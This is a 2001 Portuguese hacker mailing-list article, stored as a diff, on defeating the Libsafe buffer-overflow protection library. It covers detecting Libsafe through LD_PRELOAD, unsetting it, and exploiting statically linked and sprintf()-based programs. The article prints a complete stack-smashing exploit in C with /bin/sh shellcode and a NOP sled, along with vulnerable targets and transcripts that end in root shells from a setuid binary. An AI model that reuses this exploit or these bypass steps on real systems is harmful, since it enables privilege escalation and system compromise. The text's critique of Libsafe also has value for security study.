@@ -1,0 +1,371 @@
+/* Artigo Publicado Para a Mail List da Unsekurity Scene.
+ * http://unsekurity.virtualave.net/			
+ * FAVOR MANTER PRIVATE!
+ * Junho/2001.
+ */
+
+
+Desenvolvido por Nash Leon.
+nashleon@yahoo.com.br
+http://www.kimera.com.br/
+
+		*******************************************
+		*  Analise da Libsafe - Problemas Serios  * 
+		*******************************************
+
+
+* Introducao
+* O que eh a Libsafe
+* Hacking Libsafe
+* Consideracoes Finais
+
+
+-------------
+* Introducao |
+-------------
+
+Neste simples artigo para a mail list da Unsekurity Scene, pretendo
+demonstrar alguns esquemas basicos, porem eficazes contra uma das
+ferramentas mais utilizadas para evitar exploitacao via buffer overflows.
+O problema demonstrado aqui eh serissimo e pode ser bem mais expansivel
+do que eu imagino.Acredito que ainda nao foram feitas "serias" analises
+da Libsafe mundo a fora, por isso, esses problemas nao foram divulgados,
+sendo que voces, irmaos newbies da Unsekurity Scene, serao os primeiros
+a tomarem contato com este problema.
+
+Como se trata de uma ferramenta "Anti-Overflows", conhecimentos basicos
+de C, Buffer Overflows e Linux se fazem necessarios.O problema pode ser
+maior expansivel e nos meus testes obtive sucesso em investidas tanto
+locais como remotas em um Linux Slackware 7.0, kernel 2.2.13
+(Meu favorito!:)).Testem os esquemas em suas distribuicoes e vejam se
+as mesmas possuem condicoes semelhantes de exploitacao.
+
+---------------------
+* O que eh a Libsafe |
+---------------------
+
+Libsafe eh outra ferramenta tambem muito difundida que procura 'proteger'
+um sistema contra varios tipos de ataques de Buffer Overflows.Assim como
+a maioria das ferramentas "Anti-Overflows", seu conceito eh limitado a
+regiao do 'Stack'(ataques do tipo stack smashing), o metodo usado por ela,
+consiste em interceptar todas as chamadas das funcoes da biblioteca que sao 
+'amplamente' conhecidas como vulneraveis.Abaixo seguem as funcoes 
+reconhecidamente inseguras que sao  monitoradas pela LibSafe:
+
+strcpy(char *dest, const char *src)
+strcat(char *dest, const char *src)
+getwd(char *buf)
+gets(char *s)
+[vf]scanf(const char *format, ...)
+realpath(char *path, char resolved_path[])
+[v]sprintf(char *str, const char *format, ...)
+
+Como podemos notar logo de cara, uma funcao diferente das citadas acima
+pode perfeitamente ser exploitada e a LibSafe nao serah capaz de proteger
+o sistema contra o exploit! Mas veremos antes como detectar localmente
+se a 'LibSafe' estah instalada no sistema e a partir da sua deteccao,
+veremos como "hackea-la".
+
+------------------
+* Hacking Libsafe |
+------------------
+
+Crie voce mesmo um programa vulneravel a stack overflow e tente
+exploitar o mesmo.Voce poderah ver uma saida parecida com a que
+segue abaixo:
+
+Detected an attempt to write across stack boundary.
+Terminating /crazy/my/over/libsafe/furo.
+
+ou mesmo 'Segmentation Fault'(mesmo que voce tenha se certificado quanto
+a exploitacao do mesmo).
+
+Como podemos notar, ele termina a execucao do programa e tambem escreve
+esta tentativa de sobrescrever o limite do stack no sistema de
+log(/var/log/syslog).Por isso, devemos estar atentos que se um sistema
+possui 'LibSafe' instalado, ele pode logar uma investida mal-sucedida
+de nossa parte.
+
+Em sua instalacao padrao, nos podemos tambem procurar ele em seu
+PATH 'default', geralmente '/lib/libsafe.so.1.3', ou mesmo em um arquivo
+de inicializacao como /etc/profile podemos nos deparar com as seguintes
+linhas:
+
+LD_PRELOAD=/lib/libsafe.so.1.3
+export LD_PRELOAD
+
+Mas na realidade, o modo mais simples de realmente sabermos se o sistema
+possui 'libsafe' instalado e se o administrador eh irresponsavel(a
+maioria),eh simplesmente digitarmos 'env':
+
+$ env | more
+PWD=/home/nashleon
+LD_PRELOAD=/lib/libsafe.so.1.3
+
+Ele deve nos acusar logo que cara que temos esta ferramenta como uma
+'barreira'.
+
+Nesta Configuracao nao tem muito segredo em 'passar' por esta ferramenta
+em sua instalacao default!! Ou seja, basta retirarmos a variavel
+enviroment
+e nao existirah mais LibSafe a nossa frente!
+
+Vejamos Abaixo uma implementacao usando 'return into libc':
+
+
++ Com LibSafe:
+
+$ env | more
+PWD=/crazy/my/over/libsafe
+LD_PRELOAD=/lib/libsafe.so.1.3
+HZ=100
+...
+
+$ id
+uid=1000(nashleon) gid=100(users) groups=100(users)
+$ ls -l furo
+-rwsr-sr-x   1 root     root        12181 Aug 19 06:29 furo*
+$ ./omega1 8 furo
+System() is at 0x4005f6f8
+"/bin/sh" is at 0x400f8866
+print /bin/sh
+Executing
+System() is at 0x4005b6f8
+Segmentation fault
+
+Como podemos notar, nao conseguimos mesmo exploitar o programa.Entao
+procurando 'vestigios' do LibSafe  atraves de 'env' podemos notar que
+ele estah instalado e em perfeito funcionamento.Abaixo segue a
+implementacao para exploitarmos o sistema.
+
+$ unset LD_PRELOAD
+$ env | more
+PWD=/crazy/my/over/libsafe
+HZ=100
+
+Retiramos a variavel 'environment' do sistema.Agora tentamos exploitar
+o programa bugado:
+
+$ ./omega1 8 furo
+System() is at 0x4005b6f8
+"/bin/sh" is at 0x400f4866
+print /bin/sh
+Executing
+System() is at 0x4005b6f8
+sh-2.03#
+
+Bingo!!:).. Como podemos notar, em sua instalacao 'default', ele eh
+facilmente 'derrubado' e nao representa nenhum empecilho para um fucador!
+
+Mas nao existe somente uma instalacao possivel para o 'LibSafe', na
+verdade, um administrador com conhecimentos basicos em 'Linux' sabe
+das facilidades que eh 'descarregar' uma variavel environment e vai
+tentar dificultar ao maximo, por isso, esteja atento!! Ele poderia por
+exemplo instalar em um arquivo '/etc/ld.so.preload' a seguinte linha
+abaixo:
+
+/lib/libsafe.so.1.3
+
+Que eh justamente o PATH onde se localiza o 'LibSafe', ou mesmo colocar
+em seu .profile e etc.Fique atento e analise bem o sistema alvo.Caso
+de fato ele tenha instalado no 'ld.so.preload', teremos que ir mais
+longe e implementar uma tecnica "mais complicada".
+
+Alguns programas sao compilados com uma opcao especial do "GCC" que torna
+quase que ineficaz o uso da LibSafe nesses programas.A opcao
+"-static" nos permite passar tranquilamente pela Libsafe e se o programa
+alvo possui sua propria implementacao de funcoes bugadas, a Libsafe
+se torna ineficaz.Vejamos abaixo um exemplo:
+
+-------------------------- alvo.c -------------------------------
+#include <stdio.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[0]){
+char buffer[512];
+if(argc < 2){
+printf("Uso: %s string\n",argv[0]);
+exit(0);
+}
+strcpy(buffer,argv[1]);
+printf("Voce digitou: %s\n",buffer);
+return 0;
+}
+---------------------------------------------------------------
+
+Usaremos o seguinte exploit para os nossos testes:
+
+------------------------ ex.c ---------------------------------
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define NOP     0x90
+#define ALIGN      0
+#define ALVO   "./alvo"
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+int main(int argc, char *argv[]){
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+retaddr = pega_sp() - offset;
+
+for (i=0;i<tamanho;i+=4)
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+/* Enchemos uma parte do buffer com NOP's */
+
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+
+/* Copiamos shellcode sobre buffer */
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Finalmente executamos o programa */
+
+execl(ALVO,ALVO,buffer,0);
+}
+----------------------------------------------------------------
+
+Testando normalmente.
+
+# gcc -o alvo alvo.c
+# gcc -o ex ex.c
+# ./ex 550
+Detected an attempt to write across stack boundary.
+Terminating /work/testes/detlib/alvo.
+
+Como podemos ver, a LibSafe nos detectou.Mas se a compilacao
+segue com outros parametros:
+
+# gcc -o alvo alvo.c -static
+# ./ex 550
+Voce digitou: 
+
+(Muito Lixo)
+sh-2.03#
+
+Como podemos ela falha.
+
+***** Problemas com sprintf()
+
+Aqui rola a novidade! A Libsafe 2.0 afirma em sua documentacao ser capaz
+de detectar e impedir exploitacao via ataque smashing stack atraves de
+bugs na funcao sprintf().Vejamos que a realidade nao eh bem assim:
+
+--------------------------- alvo2.c -------------------------------
+
+/* Programa Vulneravel em sprintf() */
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[0]){
+char buffer[512];
+if(argc < 2){
+printf("Uso: %s string\n",argv[0]);
+exit(0);
+}
+sprintf(buffer,"%s",argv[1]);
+printf("Voce digitou: %s\n",buffer);
+return 0;
+}
+--------------------------------------------------------------
+
+Vejamos normalmente:
+
+# gcc -o alvo2 alvo2.c
+# ./ex 550
+(Muito Lixo)
+sh-2.03#
+
+Eu considero este problema serissimo.A falsa seguranca gerada pela
+LibSafe 2.0 neste caso eh consideravel! Eu descobri este problema enquanto
+codava um exploit local(bug descoberto por um fucador conhecido) e havia
+me esquecido que a LibSafe estava ativa no sistema, me perguntei:"Ela
+deveria ter impedido a exploitacao!!", mas nao impediu e realmente foi
+incapaz ateh de detectar.
+
+Existem varios outros problemas na Libsafe 2.0(Versao mais atual) que
+torna trivial passar por ela.Um exemplo eh uma condicao de Heap Overflow
+na propria Libsafe quando esta tenta defender o sistema contra exploitacao
+em getwd().
+
+-----------------------
+* Consideracoes Finais |
+-----------------------
+
+Ainda nao contactei os autores desta ferramenta, e pra ser sincero,
+nao pretendo contactar.Sao grandes empresas(Bell Labs) que insistem
+num conceito ao meu ver bastante ineficaz(solucionar o problema
+externamente), na pratica o bug estarah sempre lah, a funcao strcpy(),
+sprintf(), getwd() mau implementadas estarao no codigo do programa
+a espera de um fucador para passar pelo programa externo(LibSafe) e
+exploita-las.Devem existir mais condicoes de exploitacoes da Libsafe
+tais como manipulacao de ponteiros, fomit-frame, heap overflows e etc.
+Se voce soluciona a condicao bugada(mah programacao) no proprio codigo
+bugado, essas tecnicas de exploitacao se tornam ineficazes.
+
+Reconheco o empenho dos criadores de tal ferramenta, mas infelizmente,
+grande parte da Comunidade de Seguranca tem dirigido esforcos numa
+direcao erronea e terminam nao solucionando "1 problema se quer"! Nao
+sei se isso acontece por ganancia das Empresas de Seguranca, mas deve-se
+sempre pensar no usuario comum, ele nao tem culpa dos erros dos
+programadores e da incompetencia(ou mah feh) da Comunidade de Seguranca.
+
+Gostaria de agradecer ao "cursed", pelo bug descoberto num programa do
+linux, pois foi a partir dele que me foi "manifestado" o problema do
+sprintf() da Libsafe.
+
+Links e Referencias:
+
+http://unsekurity.virtualave.net/txts/over.txt
+http://www.research.avayalabs.com/project/libsafe/index.html
+
+
+Um Abraco a Todos.
+
+Nash Leon.
+
+
+
+
+
+
+
+
+
